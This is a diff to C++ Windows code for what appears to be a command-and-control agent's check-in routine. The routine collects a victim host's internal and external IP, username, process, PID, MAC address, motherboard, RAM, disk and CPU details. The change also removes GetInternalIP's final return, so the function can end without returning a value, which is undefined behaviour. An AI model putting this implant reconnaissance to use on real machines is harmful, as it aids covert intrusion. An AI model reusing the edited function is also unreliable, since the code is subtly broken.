@@ -14,6 +14,7 @@
 #include <memory>
 #include <array>
 #include <cmath>
+#include <cstdio>
 
 #pragma comment(lib, "psapi.lib")
 #pragma comment(lib, "iphlpapi.lib")
@@ -118,24 +119,28 @@ std::string AgentModule::GetInternalIP() {
             // Ignore loopback and inactive interfaces
             if (pAddresses->IfType != IF_TYPE_SOFTWARE_LOOPBACK && pAddresses->OperStatus == IfOperStatusUp) {
                 PIP_ADAPTER_UNICAST_ADDRESS pUnicast = pAddresses->FirstUnicastAddress;
-                while (pUnicast) {
-                    sockaddr_in* sa_in = reinterpret_cast<sockaddr_in*>(pUnicast->Address.lpSockaddr);
-                    char ipStr[INET_ADDRSTRLEN];
-                    
-                    // Convert IP binary data to a readable string string
-                    if (getnameinfo((struct sockaddr*)sa_in, sizeof(sockaddr_in), ipStr, sizeof(ipStr), NULL, 0, NI_NUMERICHOST) == 0) {
-                        std::wcout << L"Adapter: " << pAddresses->FriendlyName << L"\n";
-                        return ipStr;
+                while (pUnicast)
+                {
+                    if (pUnicast->Address.lpSockaddr->sa_family == AF_INET)
+                    {
+                        sockaddr_in* sa_in = reinterpret_cast<sockaddr_in*>(pUnicast->Address.lpSockaddr);
+                        
+
+                        int b1 = sa_in->sin_addr.S_un.S_un_b.s_b1;
+                        int b2 = sa_in->sin_addr.S_un.S_un_b.s_b2;
+                        int b3 = sa_in->sin_addr.S_un.S_un_b.s_b3;
+                        int b4 = sa_in->sin_addr.S_un.S_un_b.s_b4;
+
+                        char ipBuffer[16];
+                        sprintf_s(ipBuffer, "%d.%d.%d.%d", b1, b2, b3, b4);
+                        return std::string(ipBuffer);
                     }
                     pUnicast = pUnicast->Next;
                 }
             }
             pAddresses = pAddresses->Next;
         }
-    } else {
-        std::cerr << "Failed to fetch internal network interfaces.\n";
-    }
-    return "";
+    } 
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
@@ -277,16 +282,16 @@ IntitalCheckinRequest AgentModule::GetHostInformation()
     {
         GetInternalIP(),
         GetExternalViaDNS(),
-        "Windows " + GetOSVersion(),
+        "Windows " + std::to_string(GetOSVersion()),
         ConvertLPWSTRToStdString(username),
         GetProcessName(),
         GetPID(),
         "High", // TODO Integrity
         GetMachineMacAddress(),
         GetMotherBoard(),
-        GetRAM(),            // TODO RAM
-        total,     // TODO disk size
-        free,     // TODO  free disk
-        GetCpuCount() // TODO cpu count
+        GetRAM(), 
+        total, 
+        free, 
+        GetCpuCount() 
     };
 }
